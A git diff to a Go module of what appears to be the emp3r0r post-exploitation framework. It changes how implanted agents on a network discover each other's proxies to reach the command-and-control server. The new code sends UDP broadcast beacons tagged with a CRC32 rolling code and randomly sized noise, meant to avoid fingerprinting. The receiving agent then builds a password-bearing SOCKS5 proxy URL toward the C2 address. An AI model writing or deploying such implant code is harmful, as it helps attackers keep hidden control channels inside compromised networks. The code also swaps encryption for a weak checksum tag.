@@ -1,25 +1,47 @@
 package modules
 
 import (
+	"bytes"
 	"context"
+	"crypto/rand"
+	"encoding/binary"
 	"fmt"
+	"hash/crc32"
 	"log"
 	"net"
 	"net/url"
-	"strconv"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
-	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // ReverseConns record ssh reverse proxy sessions
 var ReverseConns = make(map[string]context.CancelFunc)
+
+// getRollingTag generates a time-based token (TOTP style)
+// It creates a unique 4-byte signature for the given time slot.
+func getRollingTag(timeSlot int64) []byte {
+	// 1. Convert time slot to bytes
+	buf := new(bytes.Buffer)
+	binary.Write(buf, binary.LittleEndian, timeSlot)
+
+	// 2. Hash the Shared Secret + Time Slot
+	// We use the MagicString as the secret key
+	key := []byte(def.MagicString)
+	input := append(key, buf.Bytes()...)
+
+	// 3. Calculate Checksum (CRC32 is fine here as it's now dynamic)
+	checksum := crc32.ChecksumIEEE(input)
+
+	// 4. Return as bytes
+	out := new(bytes.Buffer)
+	binary.Write(out, binary.LittleEndian, checksum)
+	return out.Bytes()
+}
 
 // BroadcastServer listen on a UDP port for broadcasts
 // wait for some other agents to announce their internet proxy
@@ -106,43 +128,60 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			continue
 		}
 
-		// decrypt broadcast message
-		decBytes, err := crypto.AES_GCM_Decrypt(def.AESPassword, buf[:n])
-		if err != nil {
-			log.Printf("BroadcastServer: %v", err)
+		// Filter 1: Check length (ignore tiny runt packets < 32 bytes)
+		if n < 32 {
+			continue
 		}
-		decMsg := string(decBytes)
-		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
+
+		// Calculate Time Slots (30 second intervals)
+		now := time.Now().Unix()
+		currentSlot := now / 30
+		prevSlot := currentSlot - 1 // Allow 30s drift
+
+		// Generate valid tags for Now and (Now - 30s)
+		validTagCurrent := getRollingTag(currentSlot)
+		validTagPrev := getRollingTag(prevSlot)
+
+		// Validate: Does the packet header match either valid tag?
+		payload := buf[:4]
+		if !bytes.Equal(payload, validTagCurrent) && !bytes.Equal(payload, validTagPrev) {
+			continue // Invalid or expired tag (Ignore silently)
+		}
+
+		// Extract Source IP
+		udpAddr, ok := addr.(*net.UDPAddr)
+		if !ok {
+			continue
+		}
+		srcIP := udpAddr.IP.String()
+
+		// Filter 2: Ignore localhost
+		if srcIP == "127.0.0.1" || srcIP == "::1" {
+			continue
+		}
+
+		log.Printf("BroadcastServer: received beacon from %s", srcIP)
+
 		if common.RuntimeConfig.C2TransportProxy != "" &&
 			transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
 			log.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
 			continue
 		}
 
-		// parse proxy message
-		// the broadcast message should be in the format of "socks5://user:pass@host:port"
-		// we only need the host part as SS server address
-		parsed_url, err := url.Parse(decMsg)
-		if err != nil {
-			log.Printf("BroadcastServer parse proxy URL: %v", err)
+		// Reconstruct SOCKS5 URL
+		proxy_url := fmt.Sprintf("socks5://%s:%s@%s:%s",
+			common.RuntimeConfig.ShadowsocksLocalSocksPort,
+			common.RuntimeConfig.Password,
+			srcIP,
+			common.RuntimeConfig.AgentSocksServerPort)
+
+		// Check deduplication
+		if common.RuntimeConfig.C2TransportProxy == proxy_url {
 			continue
 		}
-		proxy_host := parsed_url.Hostname()
-
-		// start a Shadowsocks local socks5 proxy using the server address in the broadcast message
-		proxy_url := fmt.Sprintf("socks5://127.0.0.1:%s", common.RuntimeConfig.ShadowsocksLocalSocksPort)
 
 		// test proxy
 		is_proxy_ok := transport.IsProxyOK(proxy_url, def.CCAddress)
-
-		// if the proxy is not working
-		// restart Shadowsocks local socks5 proxy
-		if !is_proxy_ok {
-			go c2transport.ShadowsocksLocalSocks(proxy_host, common.RuntimeConfig.ShadowsocksLocalSocksPort)
-		}
-
-		// test proxy again
-		is_proxy_ok = transport.IsProxyOK(proxy_url, def.CCAddress)
 
 		if is_proxy_ok {
 			common.RuntimeConfig.C2TransportProxy = proxy_url
@@ -188,32 +227,6 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 	go StartBroadcast(false, ctx, cancel)
 }
 
-// BroadcastMsg send a broadcast message on a network
-func BroadcastMsg(msg, dst string) (err error) {
-	srcport := strconv.Itoa(util.RandInt(8000, 60000))
-	pc, err := net.ListenPacket("udp4", ":"+srcport)
-	if err != nil {
-		return
-	}
-	defer pc.Close()
-
-	// send to specified addr by default
-	addr, err := net.ResolveUDPAddr("udp4", dst)
-	if err != nil {
-		return
-	}
-
-	// encrypt message
-	encMsg, err := crypto.AES_GCM_Encrypt(def.AESPassword, []byte(msg))
-	if err != nil {
-		return fmt.Errorf("failed to encrypt %s", msg)
-	}
-
-	_, err = pc.WriteTo([]byte(encMsg), addr)
-	log.Printf("BroadcastMsg: sent %x (%s) to %s", encMsg, msg, dst)
-	return
-}
-
 func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
 	// disable broadcasting when interval is 0
 	if common.RuntimeConfig.ProxyChainBroadcastIntervalMax == 0 {
@@ -240,22 +253,50 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 		log.Print("Broadcasting stopped")
 		cancel()
 	}()
+
 	for ctx.Err() == nil {
 		log.Print("Broadcasting our proxy...")
 		time.Sleep(time.Duration(util.RandInt(common.RuntimeConfig.ProxyChainBroadcastIntervalMin, common.RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)
+
+		// [IMPORTANT] Generate the tag FRESH for this moment
+		timeSlot := time.Now().Unix() / 30
+		magicTag := getRollingTag(timeSlot)
+
+		// Prepare payload: 4 bytes tag + random noise (28+ bytes)
+		// Randomize packet size to avoid fingerprinting (32 to 256 bytes)
+		packetSize := util.RandInt(32, 256)
+		payload := make([]byte, packetSize)
+		copy(payload[:4], magicTag)
+		rand.Read(payload[4:])
+
 		ips := netutil.IPaddr()
 		for _, netip := range ips {
-			proxyMsg := fmt.Sprintf("socks5://%s:%s@%s:%s",
-				common.RuntimeConfig.ShadowsocksLocalSocksPort,
-				common.RuntimeConfig.Password,
-				netip.IP.String(), common.RuntimeConfig.AgentSocksServerPort)
 			broadcastAddr := netutil.IPbroadcastAddr(netip)
 			if broadcastAddr == "" {
 				continue
 			}
-			err := BroadcastMsg(proxyMsg, broadcastAddr+":"+common.RuntimeConfig.ProxyChainBroadcastPort)
+
+			// Send raw UDP packet
+			dst := broadcastAddr + ":" + common.RuntimeConfig.ProxyChainBroadcastPort
+			addr, err := net.ResolveUDPAddr("udp4", dst)
 			if err != nil {
-				log.Printf("BroadcastMsg failed: %v", err)
+				log.Printf("StartBroadcast resolve %s: %v", dst, err)
+				continue
+			}
+
+			conn, err := net.ListenPacket("udp4", ":0")
+			if err != nil {
+				log.Printf("StartBroadcast listen: %v", err)
+				continue
+			}
+
+			_, err = conn.WriteTo(payload, addr)
+			conn.Close()
+
+			if err != nil {
+				log.Printf("StartBroadcast send to %s: %v", dst, err)
+			} else {
+				log.Printf("StartBroadcast: sent beacon to %s", dst)
 			}
 		}
 	}
